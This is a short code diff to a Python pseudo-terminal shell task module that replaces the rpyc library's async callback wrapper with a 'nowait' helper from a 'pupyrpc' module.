@@ -12,17 +12,18 @@ import pty
 import fcntl
 import subprocess
 import select
-import rpyc
 import array
 import pwd
 import errno
 import shlex
 
 from collections import deque
+from network.lib.pupyrpc import nowait
 
 from pupy import manager, Task
 
 DEFAULT_SHELL = None
+
 
 def propose_shell():
     PATHS = os.environ.get(
@@ -299,8 +300,8 @@ class PtyShell(Task):
 
     def attach(self, read_cb, close_cb):
         if self.active:
-            self.read_cb = rpyc.async(read_cb)
-            self.close_cb = rpyc.async(close_cb)
+            self.read_cb = nowait(read_cb)
+            self.close_cb = nowait(close_cb)
 
             if self._buffer:
                 for item in self._buffer:
